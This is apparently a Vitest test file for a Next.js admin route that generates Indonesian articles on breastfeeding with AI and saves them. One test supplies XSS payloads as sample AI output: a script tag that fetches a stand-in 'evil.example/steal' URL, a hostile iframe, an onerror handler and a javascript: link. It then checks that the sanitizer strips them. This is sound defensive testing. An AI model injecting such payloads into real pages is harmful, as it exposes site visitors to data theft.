import { NextRequest } from "next/server"
import { beforeEach, describe, expect, it, vi } from "vitest"

const mockRequireAdminMutationApi = vi.fn()
const mockRevalidatePath = vi.fn()
const mockGenerateArticleWithProvider = vi.fn()
const mockLoadActiveAiKeys = vi.fn()
const mockResolveImageProvider = vi.fn()
const mockGenerateImageWithProvider = vi.fn()
const mockIngestImage = vi.fn()

const mockPrisma = {
    aiTask: { create: vi.fn(), update: vi.fn() },
    aiApiKey: { update: vi.fn() },
    post: { findUnique: vi.fn(), create: vi.fn() },
}

vi.mock("@/lib/db/prisma", () => ({ default: mockPrisma }))

vi.mock("next/cache", () => ({
    revalidatePath: mockRevalidatePath,
    revalidateTag: vi.fn(),
    unstable_cache: (fn: unknown) => fn,
}))

vi.mock("@/lib/security/admin", () => ({
    requireAdminApi: vi.fn(),
    requireAdminMutationApi: mockRequireAdminMutationApi,
}))

vi.mock("@/lib/observability/admin-log", () => ({
    logAdminError: vi.fn(),
    logAdminInfo: vi.fn(),
    logAdminWarn: vi.fn(),
}))

vi.mock("@/lib/security/api-key-crypto", () => ({
    decryptStoredApiKey: vi.fn((value: string) => `dec:${value}`),
}))

vi.mock("@/lib/ai/provider", async () => {
    const actual = await vi.importActual<typeof import("@/lib/ai/provider")>("@/lib/ai/provider")
    return {
        ...actual,
        generateArticleWithProvider: mockGenerateArticleWithProvider,
        generateImageWithProvider: mockGenerateImageWithProvider,
    }
})

vi.mock("@/lib/ai/key-rotary", async () => {
    const actual = await vi.importActual<typeof import("@/lib/ai/key-rotary")>("@/lib/ai/key-rotary")
    return {
        ...actual,
        loadActiveAiKeys: mockLoadActiveAiKeys,
        resolveImageProvider: mockResolveImageProvider,
    }
})

vi.mock("@/lib/media/ingest", async () => {
    const actual = await vi.importActual<typeof import("@/lib/media/ingest")>("@/lib/media/ingest")
    return {
        ...actual,
        ingestImage: mockIngestImage,
    }
})

const adminIdentity = {
    id: "admin-gen-1",
    email: "admin@example.com",
    role: "ADMIN" as const,
    source: "database" as const,
}

const { POST: generateArticle } = await import("@/app/api/admin/ai/generate/route")

function longParagraph(times: number): string {
    return `<p>${"Panduan praktis menyusui bagi ibu baru dengan langkah terukur. ".repeat(times)}</p>`
}

function buildAiArticle(overrides: Partial<Record<string, string>> = {}) {
    return {
        title: "Panduan Lengkap Menyusui untuk Ibu Baru",
        contentHtml: `${longParagraph(20)}<h2>Langkah</h2><ul><li>Persiapan</li><li>Pelekatan</li></ul>`,
        excerpt: "Panduan ini membahas langkah praktis menyusui untuk ibu baru secara aman dan nyaman.",
        metaTitle: "Panduan Menyusui untuk Ibu Baru",
        metaDescription:
            "Pelajari langkah praktis menyusui untuk ibu baru, mulai dari persiapan hingga evaluasi pelekatan bayi.",
        focusKeyword: "panduan menyusui",
        slugSuggestion: "panduan-lengkap-menyusui-ibu-baru",
        ...overrides,
    }
}

function buildRequest(body: unknown) {
    return new NextRequest("http://localhost/api/admin/ai/generate", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(body),
    })
}

describe("POST /api/admin/ai/generate: sanitization and publish control", () => {
    beforeEach(() => {
        vi.clearAllMocks()

        mockRequireAdminMutationApi.mockResolvedValue({ ok: true, identity: adminIdentity })
        mockPrisma.aiTask.create.mockResolvedValue({ id: "task-gen-1" })
        mockPrisma.aiTask.update.mockResolvedValue({})
        mockPrisma.aiApiKey.update.mockResolvedValue({})
        mockPrisma.post.findUnique.mockResolvedValue(null)
        mockLoadActiveAiKeys.mockResolvedValue([
            {
                id: "key-1",
                provider: "gemini",
                apiKey: "enc-key-1",
                baseUrl: null,
                model: null,
                capability: "text",
            },
        ])
        mockResolveImageProvider.mockResolvedValue(null)
    })

    it("strips script/iframe/event handlers from AI HTML before persisting", async () => {
        mockGenerateArticleWithProvider.mockResolvedValueOnce(
            buildAiArticle({
                contentHtml:
                    `${longParagraph(20)}` +
                    '<script>fetch("https://evil.example/steal")</script>' +
                    '<iframe src="https://evil.example"></iframe>' +
                    '<img src="x" onerror="alert(1)">' +
                    '<a href="javascript:alert(1)">klik</a>',
            })
        )
        mockPrisma.post.create.mockImplementationOnce(async ({ data }: { data: Record<string, unknown> }) => ({
            id: "post-1",
            slug: data.slug,
            title: data.title,
            status: data.status,
            featuredImage: data.featuredImage,
        }))

        const response = await generateArticle(buildRequest({ topic: "panduan menyusui ibu baru" }))
        expect(response.status).toBe(200)

        const storedContent = mockPrisma.post.create.mock.calls[0][0].data.content as string

        expect(storedContent).not.toContain("<script")
        expect(storedContent).not.toContain("<iframe")
        expect(storedContent).not.toContain("onerror")
        expect(storedContent).not.toContain("javascript:")
        expect(storedContent).toContain("<p>")
    })

    it("defaults to DRAFT and does not revalidate public paths", async () => {
        mockGenerateArticleWithProvider.mockResolvedValueOnce(buildAiArticle())
        mockPrisma.post.create.mockImplementationOnce(async ({ data }: { data: Record<string, unknown> }) => ({
            id: "post-draft",
            slug: data.slug,
            title: data.title,
            status: data.status,
            featuredImage: data.featuredImage,
        }))

        const response = await generateArticle(buildRequest({ topic: "panduan menyusui ibu baru" }))
        const body = await response.json()

        expect(body.data.post.status).toBe("DRAFT")

        const createData = mockPrisma.post.create.mock.calls[0][0].data
        expect(createData.status).toBe("DRAFT")
        expect(createData.publishedAt).toBeNull()
        expect(createData.source).toBe("ai_dashboard")
        expect(mockRevalidatePath).not.toHaveBeenCalled()
    })

    it("honors PUBLISHED status, sets publishedAt, and revalidates the slug", async () => {
        mockGenerateArticleWithProvider.mockResolvedValueOnce(buildAiArticle())
        mockPrisma.post.create.mockImplementationOnce(async ({ data }: { data: Record<string, unknown> }) => ({
            id: "post-published",
            slug: data.slug,
            title: data.title,
            status: data.status,
            featuredImage: data.featuredImage,
        }))

        const response = await generateArticle(
            buildRequest({ topic: "panduan menyusui ibu baru", status: "PUBLISHED" })
        )
        const body = await response.json()

        expect(response.status).toBe(200)
        expect(body.data.post.status).toBe("PUBLISHED")

        const createData = mockPrisma.post.create.mock.calls[0][0].data
        expect(createData.status).toBe("PUBLISHED")
        expect(createData.publishedAt).toBeInstanceOf(Date)
        expect(mockRevalidatePath).toHaveBeenCalledWith("/panduan-lengkap-menyusui-ibu-baru")
        expect(mockRevalidatePath).toHaveBeenCalledWith("/")
    })

    it("refuses to publish thin content and does not create the post", async () => {
        mockGenerateArticleWithProvider.mockResolvedValueOnce(
            buildAiArticle({ contentHtml: `<p>${"kata ".repeat(40)}</p>` })
        )

        const response = await generateArticle(
            buildRequest({ topic: "panduan menyusui ibu baru", status: "PUBLISHED" })
        )
        const body = await response.json()

        expect(response.status).toBe(422)
        expect(body).toMatchObject({
            success: false,
            errorCode: "ARTICLE_NOT_PUBLISHABLE",
        })
        expect(mockPrisma.post.create).not.toHaveBeenCalled()
    })

    it("returns 400 when no AI key is configured", async () => {
        mockLoadActiveAiKeys.mockResolvedValueOnce([])

        const response = await generateArticle(buildRequest({ topic: "panduan menyusui ibu baru" }))
        const body = await response.json()

        expect(response.status).toBe(400)
        expect(body).toMatchObject({ errorCode: "AI_KEYS_NOT_CONFIGURED" })
        expect(mockPrisma.post.create).not.toHaveBeenCalled()
    })

    it("attaches the generated featured image when an image provider is available", async () => {
        mockGenerateArticleWithProvider.mockResolvedValueOnce(buildAiArticle())
        mockResolveImageProvider.mockResolvedValueOnce({
            keyId: "key-image-1",
            apiKey: "sk-image",
            baseUrl: "https://api.openai.com/v1",
            model: "gpt-image-1",
        })

        const pngBuffer = Buffer.alloc(64)
        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(pngBuffer)
        mockGenerateImageWithProvider.mockResolvedValueOnce({ buffer: pngBuffer, mimeType: "image/png" })
        mockIngestImage.mockResolvedValueOnce({
            mediaId: "media-1",
            url: "https://res.cloudinary.com/demo/image/upload/ai.png",
            publicId: "mumnhun/ai/x",
            width: 1536,
            height: 1024,
            mimeType: "image/png",
        })

        mockPrisma.post.create.mockImplementationOnce(async ({ data }: { data: Record<string, unknown> }) => ({
            id: "post-image",
            slug: data.slug,
            title: data.title,
            status: data.status,
            featuredImage: data.featuredImage,
        }))

        const response = await generateArticle(
            buildRequest({ topic: "panduan menyusui ibu baru", generateImage: true })
        )
        const body = await response.json()

        expect(response.status).toBe(200)
        expect(body.data.post.featuredImage).toBe("https://res.cloudinary.com/demo/image/upload/ai.png")

        const createData = mockPrisma.post.create.mock.calls[0][0].data
        expect(createData.featuredImage).toBe("https://res.cloudinary.com/demo/image/upload/ai.png")
        expect(createData.ogImage).toBe("https://res.cloudinary.com/demo/image/upload/ai.png")
        expect(mockIngestImage).toHaveBeenCalledWith(expect.objectContaining({ source: "ai" }))
    })

    it("still creates the article when image generation fails, surfacing a warning", async () => {
        mockGenerateArticleWithProvider.mockResolvedValueOnce(buildAiArticle())
        mockResolveImageProvider.mockResolvedValueOnce({
            keyId: "key-image-1",
            apiKey: "sk-image",
            baseUrl: "https://api.openai.com/v1",
            model: "gpt-image-1",
        })
        mockGenerateImageWithProvider.mockRejectedValueOnce(new Error("Provider image HTTP 500"))

        mockPrisma.post.create.mockImplementationOnce(async ({ data }: { data: Record<string, unknown> }) => ({
            id: "post-no-image",
            slug: data.slug,
            title: data.title,
            status: data.status,
            featuredImage: data.featuredImage,
        }))

        const response = await generateArticle(
            buildRequest({ topic: "panduan menyusui ibu baru", generateImage: true })
        )
        const body = await response.json()

        expect(response.status).toBe(200)
        expect(body.data.warnings?.featuredImage).toBeTruthy()
        expect(mockPrisma.post.create).toHaveBeenCalledTimes(1)
        expect(mockPrisma.post.create.mock.calls[0][0].data.featuredImage).toBeNull()
    })

    it("rejects an invalid status value at validation time", async () => {
        const response = await generateArticle(
            buildRequest({ topic: "panduan menyusui ibu baru", status: "ARCHIVED" })
        )

        expect(response.status).toBe(400)
        await expect(response.json()).resolves.toMatchObject({ error: "Validation failed" })
        expect(mockPrisma.aiTask.create).not.toHaveBeenCalled()
    })
})
